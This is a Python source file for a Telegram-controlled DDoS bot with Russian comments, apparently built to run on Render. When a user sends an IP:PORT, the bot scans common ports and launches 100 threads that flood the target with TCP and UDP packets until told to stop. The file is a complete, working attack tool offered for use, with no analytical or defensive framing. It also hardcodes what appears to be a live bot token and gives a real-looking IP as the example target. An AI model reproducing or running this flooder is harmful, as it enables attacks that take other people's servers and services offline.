#!/usr/bin/env python3
"""
DDOS BOT - TCP + UDP АТАКИ
ПРОСТАЯ ВЕРСИЯ ДЛЯ RENDER
"""

import telebot
import socket
import threading
import random
import time
import re
import os
from flask import Flask, request

# ============ ТОКЕН ============
BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ============ НАСТРОЙКИ ============
THREADS = 100  # Всего потоков (50 TCP + 50 UDP)
active_attacks = {}

# ============ АТАКИ ============
def tcp_attack(ip, port, stop_flag):
    """TCP атака"""
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.send(random._urandom(1024))
            sock.close()
        except:
            pass
        time.sleep(0.001)

def udp_attack(ip, port, stop_flag):
    """UDP атака"""
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random._urandom(1024), (ip, port))
            sock.close()
        except:
            pass
        time.sleep(0.001)

# ============ МЕНЕДЖЕР ============
class AttackManager:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.stop_flag = threading.Event()
        self.threads = []
        self.start_time = None
    
    def start(self):
        self.start_time = time.time()
        
        # TCP потоки (50)
        for i in range(THREADS // 2):
            t = threading.Thread(target=tcp_attack, args=(self.ip, self.port, self.stop_flag))
            t.daemon = True
            self.threads.append(t)
            t.start()
        
        # UDP потоки (50)
        for i in range(THREADS // 2):
            t = threading.Thread(target=udp_attack, args=(self.ip, self.port, self.stop_flag))
            t.daemon = True
            self.threads.append(t)
            t.start()
    
    def stop(self):
        self.stop_flag.set()
    
    def duration(self):
        return int(time.time() - self.start_time) if self.start_time else 0

# ============ ПАРСИНГ ============
def parse_target(text):
    match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})', text)
    if match:
        return match.group(1), int(match.group(2))
    match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
    if match:
        return match.group(1), None
    return None, None

def scan_port(ip):
    ports = [15455, 9339, 443, 80, 8080]
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.close()
            return port
        except:
            continue
    return 80

# ============ КОМАНДЫ БОТА ============
@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.reply_to(message,
        "💀 *DDOS BOT* 💀\n\n"
        "📌 Отправь IP:PORT\n"
        "📝 Пример: `43.158.103.205:15455`\n\n"
        "🛑 `stop` - остановка\n\n"
        "🔥 TCP + UDP атаки",
        parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text and m.text.lower() == 'stop')
def stop_cmd(message):
    cid = message.chat.id
    if cid in active_attacks:
        active_attacks[cid].stop()
        bot.reply_to(message, f"🛑 *Атака остановлена*", parse_mode="Markdown")
        del active_attacks[cid]
    else:
        bot.reply_to(message, "💤 *Нет активной атаки*", parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text and re.search(r'\d+\.\d+\.\d+\.\d+', m.text))
def attack_cmd(message):
    cid = message.chat.id
    ip, port = parse_target(message.text)
    
    if not ip:
        bot.reply_to(message, "❌ *Неверный IP*", parse_mode="Markdown")
        return
    
    if cid in active_attacks:
        bot.reply_to(message, "⚠️ *Атака уже идет! Отправь stop*", parse_mode="Markdown")
        return
    
    if not port:
        bot.reply_to(message, f"🔍 *Сканирую {ip}...*", parse_mode="Markdown")
        port = scan_port(ip)
    
    attack = AttackManager(ip, port)
    attack.start()
    active_attacks[cid] = attack
    
    bot.reply_to(message,
        f"💀 *АТАКА ЗАПУЩЕНА* 💀\n\n"
        f"📍 `{ip}:{port}`\n"
        f"⚡ TCP: {THREADS//2} потоков\n"
        f"⚡ UDP: {THREADS//2} потоков\n"
        f"🛑 *stop* - остановка",
        parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def unknown(m):
    bot.reply_to(m, "💀 Отправь IP:PORT\nПример: 43.158.103.205:15455\n\nstop - остановка")

# ============ WEBHOOK ============
@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
    bot.process_new_updates([update])
    return 'ok', 200

@app.route('/')
def index():
    return '✅ DDOS BOT RUNNING! Send IP:PORT'

# ============ ЗАПУСК ============
if __name__ == "__main__":
    print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║     DDOS BOT - TCP + UDP                                       ║
    ║     ПРОСТАЯ ВЕРСИЯ ДЛЯ RENDER                                  ║
    ╚════════════════════════════════════════════════════════════════╝
    """)
    
    # Установка вебхука
    RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://hostingj.onrender.com")
    webhook_url = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
    
    try:
        bot.remove_webhook()
        bot.set_webhook(url=webhook_url)
        print(f"[+] Webhook: {webhook_url}")
    except Exception as e:
        print(f"[!] Ошибка: {e}")
    
    
